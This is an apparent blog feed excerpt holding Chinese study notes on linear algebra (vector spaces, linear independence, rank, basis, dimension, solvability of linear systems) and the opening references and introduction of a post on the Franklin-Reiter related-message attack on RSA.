    <content type="html"><![CDATA[<ul><li>对于前面的矩阵和行列式的研究，已经研究出了线性方程组如果有唯一解，那么就有$det(\mathbf{A})≠0$。但是这个研究结果并不令人满意。存在一下两点：<ul><li>当$det(\mathbf{A})=0$，那么线性方程组就有两种情况，无解或者有无穷多个解，但是无法分辨出来具体是哪种情况。</li><li>在多数情况下方程组的未知数个数与方程的个数是不一样的，这种情况无法使用行列式判断。</li></ul></li><li>上面这两个问题就使得还需要研究与完善这个规律，就需要从单个方程出发，这里就引入了用一个向量表示一个方程，所以除了高中学的向量的普遍意义之外，向量还用来表示方程的系数。比如下面的线性方程组中$x_1$的系数就可以用一个列向量表示：</li></ul><p>$$<br>\begin{cases}<br>a_{11}x_1+a_{12}x_2+…+a_{1n}x_n &amp;= b_1 \<br>a_{21}x_1+a_{22}x_2+…+a_{2n}x_n &amp;= b_2\</p><pre><code class="language-\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\">a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=b_s\end&#123;cases&#125;\Rightarrow\vec&#123;a&#125;=\begin&#123;pmatrix&#125;a_&#123;11&#125; \\a_&#123;21&#125; \\...    \\a_&#123;s1&#125;\end&#123;pmatrix&#125;$$# 向量与线性空间&gt;**规定向量的运算**：&gt;&gt;取定数域$K$，设n是任意给定的正整数。令$K^&#123;n&#125;=\&#123;(a_1,a_2,...,a_n)|a_i\in K,i,1,2,...,n\&#125;$。&gt;&gt;1. 如果$a_1=b_1,a_2=b_2,...,a_n=b_n$，则称$K^&#123;n&#125;$中的两个元素：$(a_1,a_2,...,a_n)$与$(b_1,b_2,...,b_n)$相等&gt;&gt;2. 在$K^&#123;n&#125;$中加法的运算，$(a_1,a_2,...,a_n)+(b_1,b_2,...,b_n)\stackrel&#123;\mathrm&#123;def&#125;&#125;&#123;=&#125; (a_1+b_1,a_2+b_2,...,a_n+b_n)$&gt;3. 在$K^&#123;n&#125;$中数乘运算，$k(a_1,a_2,...,a_n)\stackrel&#123;\mathrm&#123;def&#125;&#125;&#123;=&#125;(ka_1,ka_2,...,ka_3)$&gt;&gt;由以上三种运算的定义或者由初等行变换可以推导出下面8条运算性质，其中加法有四条，数乘也有四条：&gt;&gt;1. $\mathbf&#123;\alpha&#125;+\mathbf&#123;\beta&#125;=\mathbf&#123;\beta&#125;+\mathbf&#123;\alpha&#125;$&gt;2. $(\mathbf&#123;\alpha&#125;+\mathbf&#123;\beta&#125;)+\mathbf&#123;\gamma&#125;=\mathbf&#123;\alpha&#125;+(\mathbf&#123;\beta&#125;+\mathbf&#123;\gamma&#125;)$&gt;3. 把元素`(0,0,...,0)`记作$\mathbf&#123;0&#125;$称为零向量，它使得：$\mathbf&#123;0&#125;+\mathbf&#123;\alpha&#125;=\mathbf&#123;\alpha&#125;+\mathbf&#123;0&#125;=\mathbf&#123;\alpha&#125;$&gt;4. 对于$\mathbf&#123;\alpha&#125;=(a_1,a_2,...,a_n)\in K^&#123;n&#125;$令，$-\mathbf&#123;\alpha&#125;\stackrel&#123;\mathrm&#123;def&#125;&#125;=(-a_1,-a_2,...,a_n)\in K^&#123;n&#125;$，则有$\mathbf&#123;\alpha&#125;+(-\mathbf&#123;\alpha&#125;)=(-\mathbf&#123;\alpha)&#125;+\mathbf&#123;\alpha&#125;=\mathbf&#123;0&#125;$，称$-\mathbf&#123;\alpha&#125;$是$\alpha$的负元&gt;5. $1\mathbf&#123;\alpha&#125;=\mathbf&#123;\alpha&#125;$&gt;6. $(kl)\mathbf&#123;\alpha&#125;=k(l\mathbf&#123;\alpha&#125;)$&gt;7. $(k+l)\mathbf&#123;\alpha&#125;=k\mathbf&#123;\alpha&#125;+l\mathbf&#123;\alpha&#125;$&gt;8. $k(\mathbf&#123;\alpha+\beta&#125;)=k\mathbf&#123;\alpha&#125;+k\mathbf&#123;\beta&#125;$&gt;&gt;满足这8条运算性质的还有如下：&gt;&gt;1. 平面上以定点O为起点的所有向量组成的集合&gt;2. 直线上以定点O为起点的所有向量组成的集合&gt;3. 空间中以定点O为起点的所有向量组成的集合&gt;数学最基本的两个概念集合和映射。&gt;&gt;**集合**：&gt;&gt;**映射**：若一个对应法则$f:A\rightarrow B$，有A中的每个元素A，都对应着B中的唯一的一个元素b，则称$f$是A到B的一个映射。&gt;&gt;b被称为a在$f$映射下的像；a被称为b在$f$映射下的**一个原像**&gt;&gt;A被称为定义域`domain`，B被称为陪域`codomain`&gt;&gt;$f$的值域(或者被称为像，像集)，$f(A):=\&#123;f(a)|a\in A\&#125;$，也记作`Imf`&gt;&gt;若$f(A)=B$，则$f$称为一个**满射**,若A中不同元素在$f$上的像不同，则称$f$是单射。&gt;&gt;如果$f$即是单射，又是满射，f称为一个双射（或一一对应）&gt;&gt;&gt;&gt;**运算**：&gt;&gt;$2+3=5$，其实就是有序整数对$(2,3)\rightarrow 5$&gt;&gt;$2*3=6$，其实就是有序整数对$(2,3)\rightarrow 6$&gt;&gt;$S×M:=\&#123;(a,b)|a\in S,b\in M\&#125;$，称为S与M的笛卡尔积。&gt;&gt;**运算的定义**：非空集合$S$上的一个**代数运算**，是指$S×S$到$S$的一个映射。&gt;**定义1**：向量、向量空间的定义。&gt;&gt;数域K上所有`n`元有序数组组成的集合$K^&#123;n&#125;$，连同定义在它上面的加法运算和数量数乘运算，及其满足的8条运算法则一起，称为数域K上的一个**n维向量空间**。$K^&#123;n&#125;$的元素称为**n维向量**，设向量$\alpha=(a_1,a_2,...,a_n)$，称$a_i$是$\alpha$的第`i`个**分量**。通常用小写的希腊字母$\alpha、\beta、\gamma、...$表示向量。&gt;&gt;&gt;&gt;**定义2**：**线性空间**，将满足上面8条运算的事物抽象出来，建立了线性空间的模型。&gt;&gt;设$V$是一个非空集合，$K$是一个数域，如果$V$上有一个运算，称为加法，即$(\alpha,\beta)\rightarrow\alpha+\beta$；&gt;&gt;$K$与$V$之间的运算，称为**数乘**，即$K×V\rightarrow V:(k,\alpha)\rightarrow k\alpha$&gt;&gt;满足下述8条运算集合，则称为**V**是数域**K**上的一个线性空间&gt;&gt;1. $\alpha+\beta=\beta+\alpha,\forall \alpha,\beta\in V$，加法交换律&gt;2. $(\alpha+\beta)+\gamma=\alpha+(\beta+\gamma),\forall \alpha,\beta,\gamma\in V$，加法结合律&gt;3. $V$中有一个元素，记作$\mathbf&#123;0&#125;$，则有下面性质，则把$\mathbf&#123;0&#125;$称为V的零元。$\alpha + 0=\alpha,\forall \alpha \in V$&gt;4. 对于$\alpha \in V$，有$\beta \in V$，使得$\alpha + \beta = 0$，把$\beta$称为$\alpha$的**负元**&gt;5. $1\alpha=\alpha,\forall \alpha \in V$&gt;6. $(kl)\alpha = k(l\alpha),\forall k,l \in K,\alpha\in V$&gt;7. $(k+l)\alpha=k*\alpha+l*\alpha,\forall k,l\in K,\alpha \in V$&gt;8. $k(\alpha+\beta)=k\alpha+k\beta,\forall k\in K,\alpha,\beta \in V$&gt;&gt;所以向量$K^&#123;n&#125;:=\&#123;(a_1,a_2,...,a_n)|a_i\in K,i=1,2,...,n\&#125;$被称为数域**K**上的线性空间，通常称为数域$K$上的n维向量空间。&gt;&gt;实际上**借用几何语言**，线性空间的元素称为一个**向量**，线性空间也可以称为**向量空间**# 线性空间的性质&gt;点动成线、线动成面、面动成体，所以集合空间中的基本元素是点。但是点与点之间有什么运算呢？所以高中引入了向量，以及向量的坐标。任意选定一个固定点$O$，就可以使用以$O$为起点的向量一一对应，$O$点本身就是零向量。这样其实就给出了几何空间的定义。&gt;&gt;**例子1**：几何空间的定义&gt;&gt;以定点$O$为起点的所有向量，构成了几何空间，满足8条运算所以是一个线性空间。&gt;&gt;**例子2**：&gt;&gt;$K^&#123;n&#125;:=\&#123;(a_1,a_2,...,a_n)|a\in K,i=1,2,...,n\&#125;$，n维向量也满足8条运算性质&gt;&gt;**例子3**：&gt;&gt;非空集合$X$到$\R$的映射，称为函数，集合$X$不要求一定是数。称为$X$上的一个实值函数。记为$\R^&#123;X&#125;:=\&#123;非空集合X到\R的映射\&#125;$&gt;&gt;**线性空间的性质**：&gt;&gt;通过这样的例子，抽象出共同点，得到线性空间。现在假定$V$是数域K上的线性空间，则归纳出以下线性空间的性质：&gt;&gt;1. $V$的零元唯一。&gt;2. 每个$\alpha \in V$的负元唯一，将$\alpha$的负元记作$-\alpha$&gt;&gt;3. $0\alpha=\mathbf&#123;0&#125;$&gt;&gt;4. $k\mathbf&#123;0&#125;=\mathbf&#123;0&#125;$&gt;5. 若$k\alpha=0$，则$k=0$或$\alpha=\mathbf&#123;0&#125;$&gt;6. $(-1)\alpha=-\alpha,\forall \alpha \in V$&gt;7. $\alpha-\beta=\alpha+(-\beta)$&gt;&gt;# 线性子空间&gt;**定义1**：线性子空间&gt;&gt;设$V$是数域$K$上的线性空间，$U$是$V$的一个非空子集，如果$U$对$V$的加法和数量乘法，也成为数域$K$上的一个线性空间，则称$U$是$V$的一个(线性)子空间。&gt;&gt;&gt;&gt;**定义2**：&gt;&gt;对于定理1中的eg2来说，$W$对于$V$的加法，数量乘法封闭，因此$W$是$V$的子空间，像这样的子空间，称它是**由向量组$\alpha_1,....,\alpha_s$生成的子空间**记作$&lt;\alpha_1,...,\alpha_s&gt;$或$L(\alpha_1,...,\alpha_s)$&gt;&gt;&gt;&gt;**定义3**：线性表出&gt;$\beta\in&lt;\alpha_1,...,\alpha_s&gt;\Longleftrightarrow$存在$K$中的一组数$l_1,...,l_s$使得$\beta=l_1\alpha_1+...+l_s\alpha_s$，此时称$\beta$可以由向量$\alpha_1,...,\alpha_s$**线性表出**&gt;&gt;&gt;&gt;**定理1：线性子空间的充要条件**：&gt;&gt;$V$的非空子集$U$是子空间：&gt;&gt;1. 若$\alpha,\beta \in U$，则$\alpha+\beta \in U$（U对于V的加法封闭）&gt;2. 若$\alpha \in U,k\in K$，则$k\alpha \in U$（U对于V的数乘封闭）&gt;&gt;eg1：$\&#123;0\&#125;$是V的子空间&gt;&gt;eg2：向量组$W=\&#123;k_1\alpha_1+...+k_s\alpha_s|k_1,..,k_s\in K\&#125;$称为向量组$\alpha_1,...,\alpha_k$的一个线性组合,也是一个V的子空间。&gt;&gt;# 线性相关与线性无关通过介绍一些有关于向量的概念，现在就要回到用向量研究线性方程组的解的问题上。现在先来解决用向量如何表示线性方程组的常数和系数。+ 如下图所示的个向量的线性方程组，我们可以使用一个列向量来表示方程组中每个方程中相同未知数的系数。$$\begin&#123;cases&#125;a_&#123;11&#125;x_1+a_&#123;12&#125;x_2+...+a_&#123;1n&#125;x_n &amp;= b_1 \\a_&#123;21&#125;x_1+a_&#123;22&#125;x_2+...+a_&#123;2n&#125;x_n &amp;= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\\a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=b_s\end&#123;cases&#125;$$+ 对于那么对于上面这个方程组，分别使用列向量$\alpha_1,...,\alpha_n$表示相同未知数前面的系数的集合，使用$\beta$表示常数，那么方程组就可以使用向量更简单的表示出来：  $$  \alpha_1=\begin&#123;pmatrix&#125;  a_&#123;11&#125; \\  a_&#123;21&#125; \\  ...    \\  a_&#123;s1&#125;  \end&#123;pmatrix&#125;,....,  \alpha_n=\begin&#123;pmatrix&#125;  a_&#123;1n&#125; \\  a_&#123;2n&#125; \\  ...    \\  a_&#123;sn&#125;  \end&#123;pmatrix&#125;  ,\beta=\begin&#123;pmatrix&#125;  b_&#123;1&#125; \\  b_&#123;2&#125; \\  ...    \\  b_&#123;s&#125;  \end&#123;pmatrix&#125;  \\  \\  x_1\alpha_1+.....+x_n\alpha_n=\beta  $$  + 那么方程组$x_1\alpha_1+.....+x_n\alpha_n=\beta$有解  + $\Longleftrightarrow$有$K$中的一组数$c_1,...,c_n$，使得$c_1\alpha_1+...+c_n\alpha_n=\beta$  + $\Longleftrightarrow\beta$可以由列向量组$\alpha_1,...,\alpha_n$**线性表出**  + $\Longleftrightarrow\beta\in&lt;\alpha_1,...,\alpha_n&gt;$  + 所以本章任务：**研究线性空间和它的子空间的结构**&gt;**定义1**：线性相关与线性无关&gt;&gt;设$V$是数域$K$上的一个线性空间，$V$中的一个向量$\alpha_1,...,\alpha_s(s≥1)$：&gt;&gt;如果有$K$中不全为0的数$k_1,....,k_s$使得$k_1\alpha_1+...+k_s\alpha_s=\vec&#123;0&#125;$，那么就称向量组$\alpha_1,...,\alpha_s$**线性相关**。&gt;&gt;如果从$k_1\alpha_1+...+k_s\alpha_s=\vec&#123;0&#125;$可以推出$k_1=...=k_s=0$，那么向量组$\alpha_1,...,\alpha_s(s≥1)$称为**线性无关**&gt;&gt;&gt;&gt;**定理1**：线性相关与无关和线性方程组的解&gt;&gt;$K^s$中，列向量组$\alpha_1,...,\alpha_n$线性相关&gt;&gt;$\Longleftrightarrow$有$K$个不全为0的数$c_1,...,c_n$使得$c_1\alpha_1+...+c_n\alpha_n=\vec&#123;0&#125;$&gt;&gt;$\Longleftrightarrow$K上n元齐次线性方程组$x_1\alpha_1+...+x_n\alpha_n=\vec&#123;0&#125;$有非零解&gt;&gt;&gt;&gt;从而$K^s$中，列向量组$\alpha_1,...,\alpha_n$线性无关&gt;&gt;$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+...+x_n\alpha_n=\vec&#123;0&#125;$只有零解 &gt;&gt;&gt;&gt;从而得出结论：$K^n$中，列向量组$\alpha_1,...,\alpha_n$线性相关(线性无关)$\Longleftrightarrow$以$\alpha_1,...,\alpha_n$为列向量组的矩阵$A$行列式等于0(不等于0)。行向量组一样。&gt;&gt;注意：$K^n$是数域K上的n维向量，而$\alpha_1,...,\alpha_n$这个向量组的向量个数是`n`，所以会矩阵A是`n×n`的数表。# 线性相关与线性无关的性质&gt;设$V$是数域$K$上的一个线性空间&gt;&gt;**性质1**：&gt;&gt;$\alpha$线性相关$\Longleftrightarrow$有$k≠0$，使得$k\alpha=\vec&#123;0&#125;$$\Longleftrightarrow \alpha=\vec&#123;0&#125;$&gt;&gt;$\alpha$线性无关$\Longleftrightarrow \alpha≠0$&gt;&gt;&gt;&gt;**性质2**：&gt;&gt;向量组$\alpha_1,...,\alpha_s$如果有一个部分组（一部分向量组成的向量组）线性相关，那么$\alpha_1,...,\alpha_s$线性相关。&gt;&gt;从而向量组$\alpha_1,...,\alpha_s$如果线性无关，那么$\alpha_1,...,\alpha_s$的任何一个部分组都线性无关。&gt;&gt;&gt;&gt;**性质3**：&gt;&gt;含有$\vec&#123;0&#125;$的任何一个向量组都线性相关&gt;&gt;&gt;&gt;**性质4**：&gt;&gt;向量组$\alpha_1,...,\alpha_s$线性相关$\Longleftrightarrow$其中至少有一个向量可以由其余向量线性表出。&gt;&gt;从而向量组$\alpha_1,...,\alpha_s$线性无关$$\Longleftrightarrow$$其中每一个向量都不能由其余向量线性表出&gt;&gt;&gt;&gt;**命题1**：线性无关的向量组特殊性质一&gt;&gt;设$\beta$可以由向量组$\alpha_1,...,\alpha_s$线性表出，则表出方式唯一。$\Longleftrightarrow$$\alpha_1,...,\alpha_s$线性无关。&gt;&gt;&gt;&gt;**命题2**：线性无关的向量组特殊性质二&gt;&gt;设$\alpha_1,...,\alpha_s$线性无关，如果$\alpha_1,...,\alpha_s,\beta$线性相关，那么$\beta$可以由$\alpha_1,....,\alpha_s$线性表出&gt;**归纳总结**：从各种角度上看线性相关和线性无关&gt;&gt;**角度1**：从线性组合看&gt;&gt;向量组$\alpha_1,....,\alpha_s(s≥1)$**线性相关**$\Longleftrightarrow$它们有系数不全为0的线性组合等于零向量&gt;&gt;向量组$\alpha_1,....,\alpha_s(s≥1)$**线性无关**$\Longleftrightarrow$它们只有系数全为0的线性组合才会等于零向量&gt;&gt;&gt;&gt;**角度2**：从线性表出看&gt;&gt;向量组$\alpha_1,....,\alpha_s(s≥2)$**线性相关**$\Longleftrightarrow$其中至少有一个向量可以由其余向量线性表出&gt;&gt;向量组$\alpha_1,....,\alpha_s(s≥2)$**线性无关**$\Longleftrightarrow$其中每一个向量都不能由其余向量线性表出。&gt;&gt;&gt;&gt;**角度3**：从齐次线性方程组看：&gt;&gt;列向量组$\alpha_1,....,\alpha_s(s≥1)$**线性相关**$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+...+x_s\alpha_s=0$有非零解。&gt;&gt;列向量组$\alpha_1,....,\alpha_s(s≥1)$**线性无关**$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+...+x_s\alpha_s=0$只有零解。&gt;&gt;&gt;&gt;**角度4**：从行列式看：&gt;&gt;n个n维列（行）向量组$\alpha_1,....,\alpha_n$**线性相关**$\Longleftrightarrow$以$\alpha_1,\alpha_2,....,\alpha_n$为列（行）向量组的矩阵的行列式**等于零**。&gt;&gt;n个n维列（行）向量组$\alpha_1,....,\alpha_s(s≥1)$**线性无关**$\Longleftrightarrow$以$\alpha_1,\alpha_2,...,\alpha_n$为列（行）向量组的句子的行列式**不等于零**。&gt;&gt;&gt;&gt;**角度5**：从向量组线性表出一个向量的方式看&gt;&gt;设向量$\beta$可以由向量组$\alpha_1,\alpha_2,...,\alpha_s$线性表出，则向量组$\alpha_1,...,\alpha_s$线性无关$\Longleftrightarrow$表出方式唯一&gt;&gt;向量组$\alpha_1,...,\alpha_s$线性相关$\Longleftrightarrow$表出方式有无穷多种&gt;&gt;&gt;&gt;**角度6**：从向量组与它的部分组的关系看&gt;&gt;如果向量组的一个部分组线性相关，那么整个向量组也线性相关。&gt;&gt;如果向量组线性无关，那么它的任何一个部分组都线性无关。&gt;&gt;&gt;&gt;**角度7**：&gt;&gt;从向量组与它的延伸组或缩短组的关系看：&gt;&gt;如果向量组线性无关，那么把每个向量添加上m个分量（所添加的位置对于每个向量都一样）得到的延伸组也线性无关。&gt;&gt;如果向量组线性相关，那么把每个向量去掉m个分量（去掉的分量的位置对于每个向量都一样）得到的缩短组也线性相关。# 极大线性无关组与向量的秩&gt;**定义1**：极大线性无关组&gt;&gt;向量组$\alpha_1,...,\alpha_s$的一个部分组（包括全部）如果满足如下条件，那么称为这个部分组是向量组的一个极大线性无关组：&gt;&gt;1. 这个部分组线性无关&gt;2. 从向量组的其余向量（如果有的话）中任取一个添进来，得到新的部分组都线性相关。&gt;&gt;**定义2**：&gt;&gt;如果向量组$\alpha_1,...,\alpha_s$的每一个向量都可以由向量组$\beta_1,...,\beta_r$线性表出，那么称向量组$\alpha_1,...,\alpha_s$可以由向量组$\beta_1,...,\beta_r$线性表出。如果向量组$\alpha_1,...,\alpha_s$与向量组$\beta_1,...,\beta_r$可以**互相线性表出**，那么称向量组$\alpha_1,...,\alpha_s$与$\beta_1,...,\beta_r$**等价**，记作$\&#123;\alpha_1,...,\alpha_s\&#125;\cong\&#123;\beta_1,...,\beta_r\&#125;$&gt;&gt;&gt;&gt;**性质1**：向量组等价的性质&gt;&gt;1. 反身性，即任何一个向量组都与自身等价&gt;2. 对称性，即如果$\alpha_1,...,\alpha_s$与$\beta_1,...,\beta_r$等价，那么$\beta_1,...,\beta_r$与$\alpha_1,...,\alpha_s$等价。&gt;3. 传递性，即如果：$\&#123;\alpha_1,...,\alpha_k\&#125;\cong\&#123;\beta_1,...,\beta_r\&#125;$，$\&#123;\beta_1,...,\beta_r\&#125;\cong \&#123;\gamma_1,...,\gamma_t\&#125;$，那么就有$\&#123;\alpha_1,...,\alpha_k\&#125;\cong\&#123;\gamma_1,...,\gamma_t\&#125;$&gt;&gt;&gt;&gt;**命题1**：&gt;&gt;向量组与它的任意一个极大线性无关组等价&gt;&gt;&gt;&gt;**推论1**：&gt;&gt;向量组的任意两个极大线性无关组等价&gt;&gt;**推论2**：&gt;&gt;$\beta$可以由向量组$\alpha_1,...,\alpha_s$线性表出当且仅当$\beta$可以由$\alpha_1,...,\alpha_s$的一个极大线性无关组线性表出。&gt;**引理1**：&gt;&gt;设向量组$\beta_1,\beta_2,...,\beta_r$可以由向量组$\alpha_1,\alpha_2,...,\alpha_s$线性表出，如果$r&gt;s$，那么$\beta_1,\beta_2,...,\beta_r$线性相关。&gt;&gt;&gt;&gt;**推论3**：&gt;&gt;设向量组$\beta_1,\beta_2,...,\beta_r$，可以由向量组$\alpha_1,\alpha_2,...,\alpha_s$线性表出，如果$\beta_1,\beta_2,...,\beta_r$线性无关，那么$r≤s$。&gt;&gt;&gt;&gt;**推论4**：&gt;&gt;向量组的任意两个极大线性无关组所含向量的个数相等。&gt;&gt;&gt;&gt;**定义3**：**重中之重**&gt;&gt;向量组的极大线性无关组所含向量的个数称为这个**向量组的秩(rank)**&gt;&gt;&gt;&gt;**命题2**：&gt;&gt;向量组$\alpha_1,\alpha_2,...,\alpha_s$线性无关的充分必要条件是它的秩等于它所含向量的个数。&gt;&gt;&gt;&gt;**命题3**：&gt;&gt;如果向量组$(I)$可以由向量组$(II)$线性表出，那么$(I)$的秩$≤(II)$的秩。&gt;&gt;&gt;&gt;**命题4**：&gt;&gt;等价的向量组有相等的秩。&gt;&gt;**注意**：秩相等的两个向量组不一定等价。# 基、维数与坐标+ 注意这块内容对应的是下册第八章线性空间的第一节，数域上线性空间的基与维数。这个是因为一个学期要上完一个学年的内容，所以丘老直接不讲具体的$K^n$上的基与维数，直接将抽象的向量空间的基与维数，还讲了坐标。+ 其实先学高代或者数论的其中一门课再去学抽代都会更轻松，因为高代中的线性空间其实也是一种代数结构，而学习抽代其实很多例子会用到数论的例子。&gt;**定义1**：子集的线性相关和线性无关的定义&gt;&gt;1. $V$的一个有限子集$\&#123;\alpha_1,...,\alpha_s\&#125;$线性相关（线性无关）$\Longleftrightarrow$向量组$\alpha_1,...,\alpha_s$线性相关（线性无关）。&gt;2. $V$的一个无限子集$S$线性相关$\Longleftrightarrow$$S$有一个有限子集是线性相关&gt;3. $V$的无限子集$S$线性无关$\Longleftrightarrow$$S$的任何一个有限子集都线性无关&gt;4. 空集$\phi$定义成线性无关&gt;&gt;&gt;&gt;**定义2**：&gt;&gt;设$V$是数域$K$上的线性空间，$V$的一个子集$S$如果满足下面两个条件，那么称$S$是$V$的一个基：&gt;&gt;1. $S$是线性无关的&gt;2. $V$中任一向量可以由$S$的有限多个向量线性表出&gt;&gt;注解1：在该定义中若$S=\&#123;\alpha_1,...,\alpha_s\&#125;$，则向量组$\alpha_1,...,\alpha_s$是$V$的一个（有序）基&gt;&gt;注解2：任何一个数域$K$上的任意线性空间都有一个基。（具体证明在下册教材第157页到158页）&gt;**定义3**：（有限维与无限维）&gt;&gt;若$V$有一个基是有限子集，则称$V$是有限维的。&gt;&gt;若$V$有一个基是无限子集，则称$V$是无限维的。&gt;&gt;&gt;&gt;**定理2**：&gt;&gt;若$V$是有限维的，则$V$的任意两个基所含向量的个数相等。&gt;&gt;&gt;&gt;**推论1**：&gt;&gt;若$V$是无限维的则$V$的任何一个基都是无限集。&gt;&gt;&gt;&gt;**定义4**：&gt;&gt;设$V$是有限维的，则把$V$的一个基所含向量的个数称为线性空间的**维数**，记作$dim_k~V$或$dim~V$&gt;&gt;若$V$是无限维的，则把$V$的维数记作$dim~V = \infty$&gt;&gt;$\&#123;0\&#125;$的维数为$0$（数0）&gt;&gt;&gt;&gt;**命题1**：&gt;&gt;设$V$的$dim~V=n$，则$V$的任意$n+1$个向量都线性相关&gt;&gt;&gt;&gt;**定义5**：&gt;&gt;设$dim~V=n$，则$V$中一个基$\alpha_1,...,\alpha_n$则$V$中任意向量$\alpha=a_1\alpha_1+...+a_n\alpha_n$，因为该表出方式唯一，所以把$\begin&#123;pmatrix&#125;a_1 \\\vdots \\a_n\end&#123;pmatrix&#125;$称为$\alpha_1,...,\alpha_n$下的坐标&gt;&gt;&gt;&gt;**命题2**：&gt;&gt;设$dim~V=n$，则$V$中任意n个线性无关的向量都是$V$的一个基&gt;&gt;**命题3**：&gt;&gt;设$dim~V=n$，如果$V$中每一个向量可以由向量组$\alpha_1,...,\alpha_n$线性表出，则$\alpha_1,...,\alpha_n$是$V$的一个基。&gt;&gt;&gt;&gt;**命题4**：&gt;&gt;设$dim~V=n$，则$V$中任意一个线性无关的向量组都可以扩充成$V$的基。&gt;&gt;&gt;&gt;**命题5**：&gt;&gt;设$dim~V=n$，$W$是$V$的一个子空间，则$dim~W≤dim~V$# 向量空间的基、维数与坐标+ 研究完抽象的线性空间的`基`、`维数`、`坐标`后接下来就拉研究向量空间的基、维数与坐标。&gt;**定义5**：&gt;&gt;设$V$是数域$K$上的线性空间，$V$的一个子集$S$如果满足：&gt;&gt;1. $S$是线性相关&gt;2. 对于$\beta∉S$（如果有的话），有$S\cup\&#123;\beta\&#125;$线性相关，那么称$S$是$V$的一个**极大线性无关集**&gt;&gt;注解1：&gt;&gt;$S$是$V$中的一个基$\Rightarrow$$S$是$V$的一个极大线性无关集&gt;&gt;（当$V≠\&#123;0\&#125;$时）$S$是$V$的一个极大线性无关集$\Rightarrow$$S$是$V$中的一个基&gt;&gt;注解2：&gt;&gt;$\phi$是$\&#123;0\&#125;$的一个极大线性无关组&gt;&gt;&gt;&gt;**命题6**：&gt;&gt;$&lt;\alpha_1,...,\alpha_s&gt;:=\&#123;k_1\alpha_1+...+k_s\alpha_s|k_1,...,k_s\in K\&#125;$，则$\alpha_1,...,\alpha_s$的一个极大线性无关组是$&lt;\alpha_1,...,\alpha_s&gt;$的一个基。&gt;&gt;因此有$dim~&lt;\alpha_1,...,\alpha_s&gt;=rank\&#123;\alpha_1,...,\alpha_s\&#125;$# 线性方程组有解的判别定理&gt;**定理1**：&gt;&gt;数域$K$上n元线性方程组假设这个n元线性方程组使用列向量与未知数表示，具体表示如下：$\alpha_1x_1+\alpha_2+x_2+....+\alpha_nx_n=\beta~~~(1)$有解&gt;&gt;$\Longleftrightarrow \beta\in&lt;\alpha_1,...,\alpha_n&gt;$&gt;&gt;$\Longleftrightarrow &lt;\alpha_1,...,\alpha_n,\beta&gt;=&lt;\alpha_1,...,\alpha_n&gt;$&gt;&gt;$\Longleftrightarrow$$dim&lt;\alpha_1,....,\alpha_n,\beta&gt;=dim&lt;\alpha_1,....,\alpha_n&gt;$&gt;&gt;$\Longleftrightarrow$增广矩阵$\tilde&#123;A&#125;$的秩=系数矩阵$A$的秩（最终结论）&gt;&gt;**定理2**：&gt;&gt;数域$K$上$n$元线性方程组$(1)$有解时，如果它的系数矩阵$A$的秩等于$n$，那么方程组$(1)$有唯一解，如果$A$的秩小于$n$那么方程组$(1)$有无穷多个解。&gt;&gt;&gt;&gt;**推论1**：&gt;&gt;数域$K$上n元齐次线性方程组有非零解的充分必要条件是：它的系数矩阵的秩小于未知量的个数$n$</code></pre>]]></content>
    
    
    <summary type="html">前言：无</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA加密Franklin-Reiter攻击</title>
    <link href="http://iyheart.github.io/2025/10/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86Franklin-Reiter%E6%94%BB%E5%87%BB/"/>
    <id>http://iyheart.github.io/2025/10/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86Franklin-Reiter%E6%94%BB%E5%87%BB/</id>
    <published>2025-10-02T01:53:15.000Z</published>
    <updated>2025-10-07T09:15:11.068Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考文章：<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack">Coppersmith 相关攻击 - CTF Wiki</a></p></li><li><p>参考文章：<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130978226">Franklin-Reiter相关消息攻击-CSDN博客</a></p></li><li><p>参考论文：<a href="https://link.springer.com/content/pdf/10.1007/3-540-68339-9_1.pdf">3-540-68339-9_1.pdf</a></p></li><li><p>参考论文：<a href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">33860001.pdf</a></p></li><li><p>在网上看了很多博客文章，大部分的博客文章只记录了两个消息线性关系的这种情况，但是个人认为这只是<code>Franklin-Reiter攻击</code>的一种。<code>消息相关攻击</code>又不是只有线性相关，消息满足非线性相关的情况也是存在的，但是这种情况目前我没有翻到相关博客，希望能找到篇宝藏博客（看论文太累了）</p></li></ul><h1 id="前言与介绍">前言与介绍</h1><p>对于<code>RSA</code>加密相关攻击中，有一个<code>Franklin-Reiter攻击</code>，该攻击也被称为<code>Related Message Attack</code>（即相关消息攻击）。该攻击针对的具体是在<code>RSA</code>加密中什么情况下的一个攻击呢？通过阅读论文，总结了如下几种类型的攻击，从特殊情况到一般情况。</p><p><strong>通过阅读论文</strong>，相关消息攻击一共分为以下几种情况，在这篇论文  <a href="https://link.springer.com/content/pdf/10.1007/3-540-68339-9_1.pdf">3-540-68339-9_1.pdf</a>  